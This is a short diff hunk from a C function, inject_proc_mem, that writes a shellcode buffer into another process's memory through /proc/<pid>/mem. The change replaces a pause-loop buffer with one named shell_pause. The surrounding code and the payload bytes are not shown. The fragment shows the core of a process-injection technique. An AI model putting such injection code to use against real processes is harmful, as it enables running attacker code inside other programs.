@@ -51,7 +51,7 @@ int inject_proc_mem(pid_t target_pid) {
     if (mem_fd == -1) { perror("[-] open mem failed"); return -1; }
     
     lseek(mem_fd, target_addr, SEEK_SET);
-    write(mem_fd, pause_loop, pause_loop_len);
+    write(mem_fd, shell_pause, shell_pause_len);
     close(mem_fd);
     
     printf("[+] Shellcode written via /proc/$pid/mem\n");
